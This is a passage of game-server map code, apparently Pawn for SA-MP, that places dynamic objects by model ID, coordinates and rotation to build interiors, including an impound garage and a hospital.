	CreateDynamicObject(19379, 1436.03015, -996.80780, 995.01910,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19379, 1436.03015, -987.17383, 995.01910,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19379, 1436.03015, -977.53979, 995.01910,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19379, 1436.03015, -967.90778, 995.01910,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19379, 1446.53076, -987.19177, 995.01910,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19379, 1457.03186, -987.19177, 995.01910,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19379, 1457.03186, -977.55780, 995.01910,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19379, 1446.53186, -977.55780, 995.01910,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19379, 1446.53186, -967.92480, 995.01910,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19379, 1446.53223, -996.81183, 995.01910,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19450, 1449.15112, -981.53003, 996.85638,   0.00000, 0.00000, 89.99190);
	CreateDynamicObject(19450, 1458.76709, -981.53003, 996.85638,   0.00000, 0.00000, 89.99190);
	CreateDynamicObject(19450, 1449.15210, -990.17499, 996.85638,   0.00000, 0.00000, 89.99190);
	CreateDynamicObject(19450, 1458.78308, -990.17499, 996.85638,   0.00000, 0.00000, 89.99190);
	CreateDynamicObject(19377, 1449.57959, -985.77112, 998.29529,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19377, 1459.64563, -985.73309, 998.27332,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19450, 1457.40637, -985.67657, 996.85638,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1569, 1457.37061, -982.48169, 995.10571,   0.00000, 0.00000, 269.37631);
	CreateDynamicObject(1569, 1457.37549, -985.46259, 995.10571,   0.00000, 0.00000, 89.99800);
	CreateDynamicObject(1569, 1457.36865, -986.57483, 995.10571,   0.00000, 0.00000, 269.37631);
	CreateDynamicObject(1569, 1457.37585, -989.57758, 995.10571,   0.00000, 0.00000, 89.99800);
	CreateDynamicObject(19431, 1440.70752, -982.46478, 996.86212,   0.00000, 0.00000, -91.56000);
	CreateDynamicObject(19431, 1440.70752, -981.04077, 996.86212,   0.00000, 0.00000, -91.14001);
	CreateDynamicObject(19431, 1439.91956, -981.72931, 996.86212,   0.00000, 0.00000, -183.05991);
	CreateDynamicObject(19431, 1441.44763, -981.76929, 996.86212,   0.00000, 0.00000, -181.92000);
	CreateDynamicObject(19431, 1441.44763, -989.43732, 996.86212,   0.00000, 0.00000, -181.92000);
	CreateDynamicObject(19431, 1440.70752, -988.71283, 996.86212,   0.00000, 0.00000, -91.56000);
	CreateDynamicObject(19431, 1440.70752, -990.13281, 996.86212,   0.00000, 0.00000, -91.56000);
	CreateDynamicObject(19431, 1439.88562, -989.40332, 996.86212,   0.00000, 0.00000, -181.92000);
	CreateDynamicObject(19431, 1431.84351, -988.67279, 996.86212,   0.00000, 0.00000, -91.56000);
	CreateDynamicObject(19431, 1431.10046, -989.40332, 996.86212,   0.00000, 0.00000, -181.92000);
	CreateDynamicObject(19431, 1431.84351, -990.13580, 996.86212,   0.00000, 0.00000, -91.56000);
	CreateDynamicObject(19431, 1432.58154, -989.40332, 996.86212,   0.00000, 0.00000, -181.92000);
	CreateDynamicObject(19431, 1432.58154, -982.06531, 996.86212,   0.00000, 0.00000, -181.92000);
	CreateDynamicObject(19431, 1431.02148, -982.01929, 996.86212,   0.00000, 0.00000, -181.92000);
	CreateDynamicObject(19431, 1431.84351, -982.75677, 996.86212,   0.00000, 0.00000, -91.56000);
	CreateDynamicObject(19431, 1431.84351, -981.32483, 996.86212,   0.00000, 0.00000, -91.56000);
	CreateDynamicObject(1569, 1432.61133, -970.15210, 995.10773,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14576, 1435.29407, -987.92871, 990.71588,   0.00000, 0.00000, -0.36000);
	CreateDynamicObject(19379, 1436.03015, -1001.03583, 995.02307,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19388, 1438.86841, -1002.63641, 996.85449,   0.00000, 0.00000, 90.90000);
	CreateDynamicObject(19450, 1440.54065, -997.84619, 996.85638,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1437.23877, -997.84979, 996.85638,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19377, 1440.83362, -1004.66913, 998.26831,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(2634, 1441.06909, -1004.53168, 992.32001,   0.00000, 0.00000, 270.07040);
	CreateDynamicObject(2198, 1433.27332, -996.86798, 989.92047,   0.00000, 0.00000, 178.63960);
	CreateDynamicObject(2198, 1433.27332, -994.02600, 989.92047,   0.00000, 0.00000, 178.63960);
	CreateDynamicObject(2198, 1433.27332, -990.89001, 989.92047,   0.00000, 0.00000, 178.63960);
	CreateDynamicObject(2198, 1433.27332, -1000.00403, 989.92047,   0.00000, 0.00000, 178.63960);
	CreateDynamicObject(16782, 1443.08545, -993.57495, 992.76324,   0.00000, 0.00000, 179.01819);
	CreateDynamicObject(3397, 1442.95642, -993.62469, 989.94727,   0.00000, 0.00000, 357.18283);
	CreateDynamicObject(3386, 1442.72241, -996.43250, 989.89600,   0.00000, 0.00000, 176.06250);
	CreateDynamicObject(3386, 1442.72241, -997.60852, 989.91400,   0.00000, 0.00000, 176.06250);
	CreateDynamicObject(3386, 1442.87439, -990.38049, 989.91400,   0.00000, 0.00000, 356.84091);
	CreateDynamicObject(3386, 1442.87439, -989.24652, 989.91400,   0.00000, 0.00000, 356.84091);
	CreateDynamicObject(18643, 1427.60217, -995.31152, 984.01813,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18643, 1418.20618, -995.31152, 984.01813,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18643, 1418.20618, -990.12750, 984.01813,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18643, 1427.60217, -990.12750, 984.01813,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18643, 1427.60217, -984.45752, 984.45007,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18643, 1418.04419, -984.45752, 984.45007,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14598, 1431.54688, -985.73328, 1010.65839,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1723, 1439.22668, -972.44214, 995.05151,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1723, 1442.60986, -973.58191, 995.05151,   0.00000, 0.00000, 269.47330);
	CreateDynamicObject(1723, 1441.65991, -976.88171, 995.05151,   0.00000, 0.00000, 179.19260);
	CreateDynamicObject(1723, 1438.09546, -975.58490, 995.05151,   0.00000, 0.00000, 86.82700);
	CreateDynamicObject(1817, 1439.95251, -975.20856, 995.11218,   0.00000, 0.00000, -0.36000);
	CreateDynamicObject(2011, 1437.90637, -970.72211, 995.11951,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2002, 1439.03247, -970.70801, 995.11951,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1776, 1440.21924, -970.60382, 996.18219,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2816, 1439.91479, -974.76520, 995.62378,   0.00000, 0.00000, -66.18000);
	CreateDynamicObject(2245, 1440.35779, -974.71698, 995.85413,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1549, 1441.38904, -970.58020, 995.07281,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2961, 1436.19360, -992.91449, 996.43372,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2690, 1436.22546, -992.86798, 996.92572,   0.00000, 0.00000, 169.80000);
	CreateDynamicObject(1999, 1435.73157, -1005.59863, 995.12238,   0.00000, 0.00000, 177.89998);
	CreateDynamicObject(1806, 1435.42896, -1003.91840, 995.12079,   0.00000, 0.00000, 146.81998);
	CreateDynamicObject(2606, 1433.61072, -1004.31232, 996.30280,   0.00000, 0.00000, 89.94000);
	CreateDynamicObject(2606, 1433.61072, -1004.31232, 996.73480,   0.00000, 0.00000, 89.94000);
	CreateDynamicObject(2606, 1433.61072, -1004.31232, 997.16681,   0.00000, 0.00000, 89.94000);
	CreateDynamicObject(2894, 1435.51477, -1005.65875, 995.93512,   0.00000, 0.00000, -156.29988);
	CreateDynamicObject(348, 1435.81042, -1005.49841, 995.93518,   91.00000, 0.00000, 38.22002);
	CreateDynamicObject(2839, 1434.89624, -1005.61493, 995.12347,   0.00000, 0.00000, 28.74000);
	CreateDynamicObject(1235, 1436.75586, -1005.67822, 995.63458,   0.00000, 0.00000, 4.14000);
	CreateDynamicObject(2881, 1436.83350, -1005.81738, 995.13568,   -2.00000, -69.00000, 28.00000);
	CreateDynamicObject(2881, 1436.72742, -1005.73517, 995.13568,   -2.00000, -69.00000, -15.20001);
	CreateDynamicObject(2007, 1420.94165, -995.75769, 996.49847,   0.00000, 0.00000, 89.76000);
	CreateDynamicObject(2007, 1420.94165, -996.70569, 996.50250,   0.00000, 0.00000, 89.76000);
	CreateDynamicObject(2007, 1420.94165, -997.65369, 996.50250,   0.00000, 0.00000, 89.76000);
	CreateDynamicObject(2007, 1420.94165, -998.60168, 996.50250,   0.00000, 0.00000, 89.76000);
	CreateDynamicObject(2007, 1420.94165, -999.54968, 996.50250,   0.00000, 0.00000, 89.76000);
	CreateDynamicObject(2942, 1446.68677, -989.58667, 995.71686,   0.00000, 0.00000, 179.99986);
	CreateDynamicObject(2942, 1448.42285, -989.58667, 995.71692,   0.00000, 0.00000, 179.99989);
	CreateDynamicObject(2942, 1450.13086, -989.58667, 995.71692,   0.00000, 0.00000, 179.99989);
	CreateDynamicObject(2690, 1434.28040, -1002.78546, 996.38782,   0.00000, 0.00000, -4.26000);
	CreateDynamicObject(1892, 1456.52942, -986.43781, 995.14093,   0.00000, 0.00000, 86.76000);
	CreateDynamicObject(1892, 1456.52942, -990.61377, 995.14093,   0.00000, 0.00000, 86.76000);
	CreateDynamicObject(1892, 1456.52942, -982.26178, 995.14093,   0.00000, 0.00000, 86.76000);
	CreateDynamicObject(14633, 1426.06604, -979.43066, 996.56683,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2811, 1456.85181, -986.05109, 995.10602,   0.00000, 0.00000, 78.96002);
	CreateDynamicObject(3386, 1442.87439, -988.14252, 989.91400,   0.00000, 0.00000, 356.84091);
	CreateDynamicObject(3386, 1442.87439, -987.03851, 989.91400,   0.00000, 0.00000, 356.84091);
	CreateDynamicObject(3386, 1442.72241, -998.80847, 989.91400,   0.00000, 0.00000, 176.06250);
	CreateDynamicObject(3386, 1442.72241, -1000.00848, 989.91400,   0.00000, 0.00000, 176.06250);
	CreateDynamicObject(3391, 1440.51379, -987.03638, 989.89600,   0.00000, 0.00000, 89.76003);
	CreateDynamicObject(3392, 1436.92480, -987.02655, 989.89398,   0.00000, 0.00000, 89.81998);
	CreateDynamicObject(1806, 1441.29553, -993.01025, 989.92133,   0.00000, 0.00000, -119.94001);
	CreateDynamicObject(2634, 1435.35193, -980.29688, 984.21887,   0.00000, 0.00000, 179.04001);
	CreateDynamicObject(1502, 1438.05847, -992.99011, 995.10675,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1499, 1438.53723, -1002.59253, 990.92316,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2690, 1440.72217, -1010.17639, 994.91425,   0.00000, 0.00000, -90.41999);
	CreateDynamicObject(2690, 1433.67712, -1004.35260, 992.91760,   0.00000, 0.00000, 83.58002);
	CreateDynamicObject(2690, 1440.74304, -1010.16492, 991.04169,   0.00000, 0.00000, -88.08002);
	CreateDynamicObject(2690, 1433.68909, -1004.27728, 988.57770,   0.00000, 0.00000, 83.94003);
	CreateDynamicObject(2690, 1433.56665, -1009.76007, 986.42206,   0.00000, 0.00000, 83.70004);
	CreateDynamicObject(18643, 1441.46216, -995.31152, 984.01813,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18643, 1441.64221, -990.12750, 984.01813,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18643, 1441.54224, -984.45752, 984.45007,   0.00000, 0.00000, 0.00000);

	// ---------------------------- INTERIOR DA GARAGEM DOS APREENDIDOS ----------------------------

	CreateDynamicObject(2957, 2335.47192, 2445.67017, 8.30939,   0.00000, 0.00000, 57.69437);
	CreateDynamicObject(2957, 2333.26440, 2441.81567, 5.77997,   0.00000, 0.00000, 62.85440);
	CreateDynamicObject(2957, 2335.42212, 2445.61792, 5.77997,   0.00000, 0.00000, 57.69437);
	CreateDynamicObject(2957, 2333.46167, 2441.78174, 8.40995,   0.00000, 0.00000, 62.85440);
	CreateDynamicObject(2957, 2294.46948, 2495.05029, 6.63656,   0.00000, 0.00000, 268.76743);
	CreateDynamicObject(2957, 2294.52490, 2499.51855, 3.81224,   0.00000, 0.00000, 269.90744);
	CreateDynamicObject(2957, 2294.52954, 2501.00952, 5.95637,   0.00000, 0.00000, 269.90744);
	CreateDynamicObject(2957, 2294.46948, 2495.05029, 3.81224,   0.00000, 0.00000, 268.76743);
	CreateDynamicObject(2957, 2294.52490, 2499.51855, 5.62419,   0.00000, 0.00000, 269.90744);
	CreateDynamicObject(2957, 2294.52954, 2501.00952, 3.81224,   0.00000, 0.00000, 269.90744);

	// ---------------------------- INTERIOR HOSPITAL ----------------------------

	CreateDynamicObject(19379,1167.7395000,-1297.1016800,13.3397000,0.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19379,1158.1048600,-1297.0817900,13.3397000,0.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19404,1161.1873800,-1292.0623800,15.0864000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19450,1167.5994900,-1292.0704300,15.0864000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1158.0124500,-1292.0623800,15.0864000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1154.8785400,-1292.0623800,15.0864000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19379,1174.4344500,-1297.0817900,13.3392000,0.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19450,1174.2457300,-1292.0623800,15.0864000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19379,1158.1048600,-1307.5810500,13.3397000,0.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19450,1174.2457300,-1297.1762700,15.0864000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19404,1179.0319800,-1293.6666300,15.0864000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19358,1179.0319800,-1296.8452100,15.0864000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19404,1179.0319800,-1300.0517600,15.0864000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19431,1179.0319800,-1302.4519000,15.0864000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19450,1174.1643100,-1302.0593300,15.0864000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19450,1167.3186000,-1302.0593300,15.0864000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19450,1153.5440700,-1296.8210400,15.0864000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19450,1153.5440700,-1306.4335900,15.0864000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19450,1158.3281300,-1312.6637000,15.0864000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19388,1169.4782700,-1300.4027100,15.0864000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19358,1169.4782700,-1297.2127700,15.0864000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19388,1169.4782700,-1293.7286400,15.0864000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19358,1169.4780300,-1296.6532000,15.0864000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19450,1153.5241700,-1316.0330800,15.0864000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19450,1162.5865500,-1306.9292000,15.0864000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19450,1162.5865500,-1316.4909700,15.0864000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19370,1154.3767100,-1302.4021000,13.6852000,180.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3804900,-1304.0703100,12.0234000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3804900,-1303.5483400,12.3714000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3804900,-1303.0262500,12.7194000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3804900,-1302.5041500,13.0674000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3804900,-1301.9821800,13.4154000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3804900,-1301.4602100,13.7634000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3804900,-1300.9382300,14.1114000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3804900,-1300.4162600,14.4594000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3804900,-1299.8942900,14.8074000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3804900,-1299.3723100,15.1554000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19450,1153.5440700,-1296.8210400,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19450,1153.5440700,-1306.4335900,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19450,1153.5241700,-1316.0330800,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19450,1158.2880900,-1320.8287400,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19450,1162.5865500,-1306.9292000,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19450,1162.5865500,-1316.4909700,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19450,1167.3186000,-1302.0612800,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19450,1174.1643100,-1302.0593300,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19404,1179.0319800,-1300.0517600,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19431,1179.0319800,-1302.4519000,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19404,1179.0319800,-1293.6666300,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19404,1161.1873800,-1292.0623800,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1154.8785400,-1292.0623800,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19379,1167.7395000,-1297.1016800,16.8184000,0.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19379,1174.4344500,-1297.0817900,16.8260000,0.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3767100,-1301.8801300,14.0332000,180.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3767100,-1301.3581500,14.3812000,180.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3767100,-1300.8361800,14.7292000,180.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3767100,-1300.3142100,15.0772000,180.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3767100,-1299.7922400,15.4252000,180.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3767100,-1299.2701400,15.7732000,180.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3767100,-1298.7480500,16.1212000,180.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3767100,-1298.2259500,16.4692000,180.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3767100,-1297.7039800,16.8172000,180.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3798800,-1296.0402800,15.1552000,180.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19370,1155.9163800,-1297.5798300,15.1552000,180.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19370,1155.9084500,-1297.8518100,15.1552000,180.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19370,1155.9244400,-1298.3737800,14.8062000,180.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19370,1155.9163800,-1298.8938000,14.4542000,180.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19370,1155.9084500,-1299.4117400,14.1082000,180.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19370,1155.9323700,-1299.9356700,13.7602000,180.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19370,1155.9244400,-1300.4595900,13.4162000,180.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19370,1155.9298100,-1300.9798600,13.0642000,180.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19370,1155.9377400,-1301.4998800,12.7152000,180.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19370,1155.9296900,-1302.0239300,12.3712000,180.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19370,1155.9082000,-1302.5487100,12.0232000,180.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19379,1158.1048600,-1309.1711400,16.8264000,0.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19379,1160.7956500,-1297.1016800,16.8264000,0.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3767100,-1294.2137500,16.8172000,180.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19370,1154.3767100,-1293.7376700,16.8092000,180.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19379,1160.7956500,-1307.5938700,16.8184000,0.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19404,1179.0319800,-1296.8608400,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19377,1167.7395000,-1296.9416500,16.8104000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,1173.8131100,-1296.9410400,16.8024000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,1161.2242400,-1296.9416500,16.8084000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,1161.2242400,-1306.5741000,16.8104000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,1157.2728300,-1308.7292500,16.8074000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19362,1154.3767100,-1293.7376700,16.8052000,0.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19362,1154.3767100,-1294.2316900,16.7972000,0.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(1533,1162.4589800,-1309.1936000,13.3520000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(1533,1162.4589800,-1307.7095900,13.3520000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(3657,1163.9689900,-1297.0833700,13.9024000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(3657,1162.3759800,-1297.0833700,13.9024000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(3657,1165.4439700,-1297.0833700,13.9024000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(3657,1160.9599600,-1297.0833700,13.9024000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2596,1169.0968000,-1296.9635000,15.9628000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(1523,1169.4973100,-1301.1613800,13.4216000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19377,1173.8131100,-1297.2569600,16.8004000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,1167.7395000,-1297.2056900,16.8024000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(1523,1169.4759500,-1292.9329800,13.4216000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(2185,1156.5983900,-1312.5463900,13.4239000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2185,1156.5871600,-1310.6922600,13.4219000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2185,1156.9106400,-1308.3818400,13.4219000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(11711,1162.5423600,-1309.1923800,16.1079000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2007,1154.1400100,-1312.0335700,13.4340000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2007,1154.1474600,-1311.0214800,13.4340000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2011,1154.0376000,-1310.1066900,13.4257500,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1715,1155.0655500,-1311.5028100,13.4262000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1715,1155.2211900,-1309.7797900,13.4262000,0.0000000,0.0000000,110.0000000); //
	CreateDynamicObject(2614,1153.6720000,-1311.3841600,15.7227000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1997,1161.3250700,-1311.6740700,13.4241000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(1997,1158.9147900,-1311.6678500,13.4241000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(19325,1160.2799100,-1292.0513900,15.1418000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19325,1160.2799100,-1292.0513900,18.1028000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19325,1179.0427200,-1294.4256600,18.1028000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19379,1158.1048600,-1319.6641800,16.8264000,0.0000000,90.0000000,90.0000000); //
	CreateDynamicObject(19450,1157.8845200,-1315.5959500,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19388,1156.3599900,-1310.7374300,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19388,1159.5003700,-1310.7374300,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19431,1154.2565900,-1310.7374300,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19431,1161.7910200,-1310.7374300,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19404,1158.0230700,-1292.0644500,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19377,1157.2728300,-1308.7292500,20.0624000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,1157.5827600,-1318.3612100,20.0624000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,1157.2728300,-1299.0852100,20.0624000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,1157.2728300,-1296.8592500,20.0704000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,1167.7668500,-1296.8592500,20.0624000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,1173.8067600,-1296.8592500,20.0604000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,1167.7668500,-1297.3463100,20.0664000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,1173.8067600,-1297.3463100,20.0564000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(970,1156.0116000,-1301.8247100,17.4320000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(970,1153.9267600,-1303.9394500,17.4320000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1715,1154.8980700,-1304.9034400,16.9128000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1715,1154.9093000,-1306.6583300,16.9128000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2773,1160.5866700,-1303.3203100,13.9279000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2773,1160.5877700,-1305.2335200,13.9259000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(932,1161.7928500,-1306.0524900,13.4262000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(932,1161.8100600,-1305.1777300,13.4262000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(932,1161.8038300,-1304.2873500,13.4262000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(932,1161.7718500,-1303.3499800,13.4262000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(932,1161.7271700,-1302.4919400,13.4262000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1808,1163.6347700,-1301.7907700,13.4256000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(19866,1169.4215100,-1297.0598100,13.3905000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19866,1169.4222400,-1297.0611600,14.1345000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19866,1169.4343300,-1297.0632300,14.8725000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2011,1164.3680400,-1301.6948200,13.4266600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1886,1154.3559600,-1312.0982700,16.7136000,20.0000000,0.0000000,120.0000000); //
	CreateDynamicObject(1886,1154.4660600,-1292.9478800,16.7136000,20.0000000,0.0000000,45.0000000); //
	CreateDynamicObject(1886,1168.3066400,-1292.8016400,16.7136000,20.0000000,0.0000000,310.0000000); //
	CreateDynamicObject(2606,1153.6784700,-1305.6994600,19.8029000,15.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2167,1153.6529500,-1307.3527800,16.8420000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2167,1153.6529500,-1306.4167500,16.8420000,0.0000000,0.0000000,90.0000000); //
